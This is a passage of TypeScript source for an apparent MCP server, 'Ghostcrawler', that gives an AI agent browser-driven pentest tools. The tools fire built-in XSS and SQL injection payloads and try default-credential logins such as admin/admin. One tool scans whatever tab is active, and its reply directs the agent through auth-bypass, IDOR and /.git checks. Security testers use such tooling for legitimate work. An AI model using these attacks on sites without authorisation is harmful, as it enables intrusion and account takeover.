          const action = rawAction.replaceAll("_", "-");

          scanAbortFlag = false;
          resetVulnDedup();
          scanState = {
            status: "scanning",
            currentTest: `Initializing scan and capturing page...`,
            progress: 0,
            vulnerabilities: [],
            totalTests: 0,
            completedTests: 0,
            phase: "",
            reasoning: "",
            activityLog: [],
          };

          pendingCommand = {
            type: "scan",
            payload: {},
            commandId: Date.now().toString(),
          };

          let waitCount = 0;
          while (!currentAttackSurface && waitCount < 25) {
            await new Promise((resolve) => setTimeout(resolve, 200));
            waitCount++;
          }

          if (!currentAttackSurface) {
            return {
              content: [
                {
                  type: "text",
                  text: "❌ Browser plan completed, but scan could not start because attack surface was not captured.",
                },
              ],
              isError: true,
            };
          }

          if (action === "trigger-all") {
            pendingCommand = {
              type: "trigger",
              payload: { delayMs: 700, formValues: {} },
              commandId: Date.now().toString(),
            };
          } else if (action === "trigger-one") {
            pendingCommand = {
              type: "trigger_button",
              payload: { index: 0, formValues: {} },
              commandId: Date.now().toString(),
            };
          } else {
            return {
              content: [
                {
                  type: "text",
                  text: `❌ Invalid liveScanAction: ${rawAction}`,
                },
              ],
              isError: true,
            };
          }

          runLiveScan().catch((error) => {
            console.error("[Scan] Error:", error);
            scanState.status = "stopped";
          });

          return {
            content: [
              {
                type: "text",
                text:
                  `✅ Browser plan executed (${steps.length} steps) and live scan started (${action}).\n` +
                  JSON.stringify(planResults, null, 2),
              },
            ],
          };
        }

        return {
          content: [
            {
              type: "text",
              text: `✅ Browser plan executed (${steps.length} steps).\n${JSON.stringify(planResults, null, 2)}`,
            },
          ],
        };
      }

      case "observe_dom_changes": {
        const input = (args as any) || {};
        const durationMs = Math.max(500, Number(input.durationMs ?? 5000));
        const selector = input.selector as string | undefined;
        const maxEvents = Math.max(20, Number(input.maxEvents ?? 200));

        const startCommandId = `${Date.now()}-dom-start`;
        pendingResult = null;
        pendingCommand = {
          type: "dom_observe_start",
          payload: { selector, maxEvents },
          commandId: startCommandId,
        };

        const startResult = await waitForCommandResult(startCommandId, 10000);
        if (!startResult || !startResult.success) {
          return {
            content: [
              {
                type: "text",
                text: `❌ Failed to start DOM observation: ${startResult?.error || "no response"}`,
              },
            ],
            isError: true,
          };
        }

        await new Promise((resolve) => setTimeout(resolve, durationMs));

        const stopCommandId = `${Date.now()}-dom-stop`;
        pendingResult = null;
        pendingCommand = {
          type: "dom_observe_stop",
          payload: {},
          commandId: stopCommandId,
        };

        const stopResult = await waitForCommandResult(stopCommandId, 10000);
        if (!stopResult || !stopResult.success) {
          return {
            content: [
              {
                type: "text",
                text: `❌ Failed to stop DOM observation: ${stopResult?.error || "no response"}`,
              },
            ],
            isError: true,
          };
        }

        const payload = stopResult.result?.result || stopResult.result || {};
        const events = payload.events || [];

        return {
          content: [
            {
              type: "text",
              text:
                `✅ DOM observation complete (${durationMs}ms). Captured ${events.length} events.\n` +
                JSON.stringify(
                  {
                    selector: selector || "document",
                    total: payload.total ?? events.length,
                    startedAt: payload.startedAt,
                    sample: events.slice(-20),
                  },
                  null,
                  2
                ),
            },
          ],
        };
      }

      case "run_attack_command": {
        const input = (args as any) || {};
        const attack = String(input.attack || "").trim();
        const observeMs = Math.max(0, Number(input.observeMs ?? 0));
        const timeoutMs = Math.max(5000, Number(input.timeoutMs ?? 20000));

        if (!attack) {
          return {
            content: [{ type: "text", text: "❌ Missing required field: attack" }],
            isError: true,
          };
        }

        if (!currentAttackSurface) {
          return {
            content: [
              {
                type: "text",
                text: "No attack surface available. Use get_attack_surface or trigger a page scan first.",
              },
            ],
            isError: true,
          };
        }

        const attackSurface = currentAttackSurface.scan;
        const formFields = (attackSurface.forms || []).flatMap((form) => form.fields || []);
        const normalizeField = (candidate: any) => ({
          ...candidate,
          haystack: [candidate.name, candidate.label, candidate.id, candidate.placeholder, candidate.type]
            .filter(Boolean)
            .join(" ")
            .toLowerCase(),
        });

        const pickFieldSelector = (patterns: RegExp[], typeHints: string[] = []) => {
          const fields = formFields.map(normalizeField);
          const field = fields.find((candidate) => {
            if (typeHints.length && !typeHints.includes(String(candidate.type || "").toLowerCase())) {
              return false;
            }
            return patterns.some((pattern) => pattern.test(candidate.haystack));
          }) || fields.find((candidate) => {
            return patterns.some((pattern) => pattern.test(candidate.haystack));
          });

          if (!field) return null;
          if (field.name) return `input[name="${field.name}"]`;
          if (field.id) return `#${field.id}`;
          return null;
        };

        const pickBestTextSelector = () => pickFieldSelector([
          /search/, /query/, /q\b/, /text/, /input/, /name/, /title/, /comment/, /message/, /email/, /phone/
        ], ["text", "search", "email", "url", "tel"]);

        const pickUsernameSelector = () => pickFieldSelector([
          /user/, /username/, /login/, /email/, /phone/, /mobile/, /contact/
        ], ["text", "email", "tel"]);

        const pickPasswordSelector = () => pickFieldSelector([
          /pass/, /password/
        ], ["password"]);

        const pickSubmitSelector = () => {
          const buttons = attackSurface.buttons as any[];
          const submitButton = buttons.find((button) => {
            const label = `${button.text || ""} ${button.name || ""} ${button.selector || ""}`.toLowerCase();
            return String(button.type || "").toLowerCase() === "submit" || /submit|sign in|log in|login|continue/.test(label);
          });

          return submitButton?.selector || buttons.find((button) => Boolean(button.visible))?.selector || null;
        };

        const attacks: any = {};
        let observationEvents: any[] = [];

        const xssPayloads = Array.isArray(input.payloads) && input.payloads.length
          ? input.payloads.map((value: any) => String(value))
          : [
              String(input.payload || "<script>alert(1)</script>"),
              "<img src=x onerror=alert(1)>",
              "<svg onload=alert(1)>",
              "\"><svg/onload=alert(1)>",
            ];

        const sqliPayloads = Array.isArray(input.payloads) && input.payloads.length
          ? input.payloads.map((value: any) => String(value))
          : [
              String(input.payload || "' OR '1'='1"),
              "' OR 1=1--",
              "' UNION SELECT NULL--",
              "admin'--",
            ];

        const defaultCredentials = Array.isArray(input.credentials) && input.credentials.length
          ? input.credentials
          : [
              { username: input.username || "admin", password: input.password || "admin" },
              { username: "admin", password: "password" },
              { username: "admin", password: "123456" },
              { username: "test", password: "test" },
            ];

        if (observeMs > 0) {
          await sendExtensionCommand("dom_observe_start", {
            selector: input.observeSelector,
            maxEvents: Math.max(20, Number(input.maxEvents ?? 200)),
          }, 10000);
        }

        try {
          if (attack === "xss") {
            const selector = input.selector || pickBestTextSelector() || pickUsernameSelector() || pickPasswordSelector();
            if (!selector) {
              throw new Error("Could not infer an input selector for XSS attack");
            }

            attacks.payloads = xssPayloads;
            const submitSelector = input.submitSelector || pickSubmitSelector();
            attacks.mode = "xss";
            attacks.selector = selector;
            attacks.attempts = [];

            for (const payload of xssPayloads) {
              const typeResult = await sendExtensionCommand("browser_action", {
                action: "type",
                selector,
                text: payload,
              }, timeoutMs);

              let clickResult: any = null;
              if (submitSelector) {
                clickResult = await sendExtensionCommand("browser_action", {
                  action: "click",
                  selector: submitSelector,
                }, timeoutMs);
              }

              attacks.attempts.push({ payload, typeResult, clickResult });
            }
          } else if (attack === "default-creds") {
            const usernameSelector = input.usernameSelector || pickUsernameSelector();
            const passwordSelector = input.passwordSelector || pickPasswordSelector();
            const submitSelector = input.submitSelector || pickSubmitSelector();

            if (!usernameSelector || !passwordSelector) {
              throw new Error("Could not infer username/password selectors for default credentials attack");
            }

            attacks.mode = "default-creds";
            attacks.usernameSelector = usernameSelector;
            attacks.passwordSelector = passwordSelector;
            attacks.attempts = [];

            for (const credential of defaultCredentials) {
              const username = String(credential.username || "");
              const password = String(credential.password || "");

              const usernameType = await sendExtensionCommand("browser_action", {
                action: "type",
                selector: usernameSelector,
                text: username,
              }, timeoutMs);

              const passwordType = await sendExtensionCommand("browser_action", {
                action: "type",
                selector: passwordSelector,
                text: password,
              }, timeoutMs);

              let clickResult: any = null;
              if (submitSelector) {
                clickResult = await sendExtensionCommand("browser_action", {
                  action: "click",
                  selector: submitSelector,
                }, timeoutMs);
              }

              attacks.attempts.push({ username, password, usernameType, passwordType, clickResult });
            }
          } else if (attack === "manual-sqli") {
            const payload = String(input.payload || sqliPayloads[0]);
            const selector = input.selector || pickBestTextSelector() || pickUsernameSelector() || pickPasswordSelector();
            const submitSelector = input.submitSelector || pickSubmitSelector();

            attacks.mode = "manual-sqli";
            attacks.payloads = sqliPayloads;

            if (input.url || input.method || input.body) {
              const requestResult = await sendExtensionCommand("browser_action", {
                action: "request",
                url: input.url || currentAttackSurface.scan.page.url,
                method: input.method || "GET",
                headers: input.headers || { "Content-Type": "application/x-www-form-urlencoded" },
                body: input.body || payload,
              }, timeoutMs);

              attacks.requestResult = requestResult;
            } else {
              if (!selector) {
                throw new Error("Could not infer an input selector for manual SQLi attack");
              }

              attacks.selector = selector;
              attacks.attempts = [];

              for (const sqlPayload of sqliPayloads) {
                const typeResult = await sendExtensionCommand("browser_action", {
                  action: "type",
                  selector,
                  text: sqlPayload,
                }, timeoutMs);

                let clickResult: any = null;
                if (submitSelector) {
                  clickResult = await sendExtensionCommand("browser_action", {
                    action: "click",
                    selector: submitSelector,
                  }, timeoutMs);
                }

                attacks.attempts.push({ payload: sqlPayload, typeResult, clickResult });
              }
            }
          } else if (attack === "http-verb" || attack === "custom-request") {
            const requestUrl = String(input.url || "").trim();
            if (!requestUrl) {
              throw new Error("Missing url for request-based attack");
            }

            const requestResult = await sendExtensionCommand("browser_action", {
              action: "request",
              url: requestUrl,
              method: String(input.method || "GET").toUpperCase(),
              headers: input.headers || {},
              body: input.body || "",
            }, timeoutMs);

            attacks.mode = attack;
            attacks.requestResult = requestResult;
          } else {
            throw new Error(`Unknown attack type: ${attack}`);
          }

          if (observeMs > 0) {
            await new Promise((resolve) => setTimeout(resolve, observeMs));
            const stopResult = await sendExtensionCommand("dom_observe_stop", {}, 10000);
            observationEvents = stopResult?.events || stopResult?.result?.events || [];
          }

          return {
            content: [
              {
                type: "text",
                text: [
                  `✅ Attack command completed: ${attack}`,
                  JSON.stringify(
                    {
                      attack,
                      page: currentAttackSurface.scan.page.url,
                      attacks,
                      observation: observeMs > 0 ? { durationMs: observeMs, events: observationEvents.slice(-20) } : undefined,
                    },
                    null,
                    2
                  ),
                ].join("\n"),
              },
            ],
          };
        } catch (error: any) {
          if (observeMs > 0) {
            try {
              const stopResult = await sendExtensionCommand("dom_observe_stop", {}, 10000);
              observationEvents = stopResult?.events || stopResult?.result?.events || [];
            } catch {}
          }

          return {
            content: [{ type: "text", text: `Error: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "auto_crawl": {
        const result = await executeAutoCrawl((args || {}) as AutoCrawlOptions) as any;
        const slim = {
          status: scanState.status,
          findings: result.findings?.length ?? 0,
          summary: result.summary,
          vulnerabilities: (result.findings ?? []).map((v: any) => {
            const out: any = { severity: v.severity, type: v.type, endpoint: v.endpoint };
            if (v.param) out.param = v.param;
            if (v.evidence) out.evidence = String(v.evidence).slice(0, 200);
            return out;
          }),
          ...(result.pocs?.length ? { pocs: result.pocs } : {}),
        };
        return {
          content: [{ type: "text", text: JSON.stringify(slim, null, 2) }],
        };
      }

      case "pentest_active_tab": {
        // 1. Auto-detect URL from active tab
        let activeUrl = "";
        try {
          const r = await sendExtensionCommand("get_url", {}, 12000);
          activeUrl = String(r?.url || r?.result?.url || "");
        } catch (e: any) {
          // Auto-run doctor so the user sees the actual broken layer
          const diag = await runDoctor();
          return {
            content: [{ type: "text", text: JSON.stringify({
              ok: false,
              error: "Could not detect active tab URL — running diagnostics:",
              diagnostics: diag,
              quickFix: diag.suggestedFix,
              details: e?.message || String(e),
            }, null, 2) }],
            isError: true,
          };
        }
        if (!activeUrl || !/^https?:/i.test(activeUrl)) {
          return {
            content: [{ type: "text", text: JSON.stringify({
              ok: false,
              error: `Active tab URL is not a valid web page: ${activeUrl || "(empty)"}`,
              hint: "Navigate to the target URL in your browser, then re-run this tool.",
            }, null, 2) }],
            isError: true,
          };
        }

        // 2. Apply preset
        const preset = String((args as any)?.preset || "full");
        let opts: AutoCrawlOptions;
        switch (preset) {
          case "quick":
            opts = { targetUrl: activeUrl, maxDepth: 1, attacks: ["xss", "manual-sqli"], observeMs: 1500 } as any;
            break;
          case "auth":
            opts = { targetUrl: activeUrl, maxDepth: 2, attacks: ["xss", "manual-sqli", "default-creds"], observeMs: 2500 } as any;
            break;
          case "api":
            opts = { targetUrl: activeUrl, maxDepth: 1, attacks: ["manual-sqli"], observeMs: 1500 } as any;
            break;
          case "full":
          default:
            opts = { targetUrl: activeUrl, maxDepth: 2, attacks: ["xss", "manual-sqli", "default-creds"], observeMs: 2000 } as any;
        }

        // 3. Fire scan in the background — do NOT await it.
        // The MCP protocol has a ~60s timeout which the full scan (up to 10 min) exceeds.
        // Progress is visible in the in-page HUD; results are available at
        // GET /ghostcrawler/scan-progress and GET /ghostcrawler/export-findings.
        executeAutoCrawl(opts).catch((err: any) => {
          console.error("[pentest_active_tab] Background scan error:", err?.message ?? err);
        });

        return {
          content: [{ type: "text", text: JSON.stringify({
            ok: true,
            status: "scan_started",
            target: activeUrl,
            preset,
            message: "Automated crawl is running in the background — do NOT call scan-progress or any polling endpoints. Your job now is to execute the full manual pentest workflow using the available tools: (1) call get_attack_surface to map forms, buttons, and API endpoints; (2) review page source for hidden fields, JS sinks, hardcoded secrets; (3) run_browser_plan to test auth bypass via hidden fields or localStorage; (4) run_browser_plan to enumerate IDOR (id=1,2,3); (5) run_attack_command xss on high-value inputs; (6) observe_dom_changes to confirm XSS; (7) run_attack_command default-creds on login forms; (8) check /robots.txt, /.git, /admin for misconfigs. Work through each step and report findings as you go.",
          }, null, 2) }],
        };
      }

      case "check_burp_mcp": {
        try {
          const tools = await getBurpMCPTools();
          return {
            content: [{ type: "text", text: JSON.stringify({ connected: true, url: BURP_MCP_URL, tools }, null, 2) }],
          };
        } catch (err: any) {
          return {
            content: [{ type: "text", text: JSON.stringify({ connected: false, url: BURP_MCP_URL, error: err?.message ?? String(err) }, null, 2) }],
          };
        }
      }

      case "gc_doctor": {
        const diag = await runDoctor();
        return { content: [{ type: "text", text: JSON.stringify(diag, null, 2) }] };
      }

      case "get_pending_probe": {
        return {
          content: [{ type: "text", text: JSON.stringify({ probe: null, note: "ProbeAI system removed — scan now runs autonomously" }) }],
        };
      }

      case "report_finding": {
        const finding = {
          type:     String(args?.type     ?? ""),
          severity: String(args?.severity ?? "Medium"),
          endpoint: String(args?.endpoint ?? ""),
          param:    String(args?.param    ?? ""),
          payload:  String(args?.payload  ?? ""),
          evidence: String(args?.evidence ?? ""),
          method:   String(args?.method   ?? ""),
          body:     String(args?.body     ?? ""),
          headers:  (args?.headers && typeof args.headers === "object") ? args.headers : {},
        };
        pushVuln(finding);
        sendFindingToBurp(finding.severity, finding.type, finding.method || "GET", finding.endpoint, finding.headers as Record<string, string>, finding.body || undefined);
        return {
          content: [{ type: "text", text: JSON.stringify({ ok: true, message: `Finding "${finding.type}" (${finding.severity}) added to HUD and sent to Burp Repeater.` }) }],
        };
      }

      case "submit_probe_decision": {
        return { content: [{ type: "text", text: JSON.stringify({ ok: false, note: "ProbeAI system removed" }) }] };
      }

      default:
        throw new Error(`Unknown tool: ${name}`);
    }
  } catch (error: any) {
    return {
      content: [{ type: "text", text: `Error: ${error.message}` }],
      isError: true,
    };
  }
});

// ══════════════════════════════════════════════════════════════════════
// Start MCP Server
// ══════════════════════════════════════════════════════════════════════

async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  console.error("[MCP Server] Ghostcrawler MCP server running");
}

main().catch((error) => {
  // Log but do not exit — MCP transport may reconnect (VS Code restart, etc.)
  // The HTTP bridge on port 3200 must keep running regardless.
  console.error("[MCP Server] Transport error (HTTP bridge still running):", error?.message || error);
});

// Hard keepalive: ensure the process never exits naturally even when MCP
// transport is disconnected and stdin is closed. The HTTP bridge must
// keep serving regardless of MCP client state.
setInterval(() => {}, 60_000);
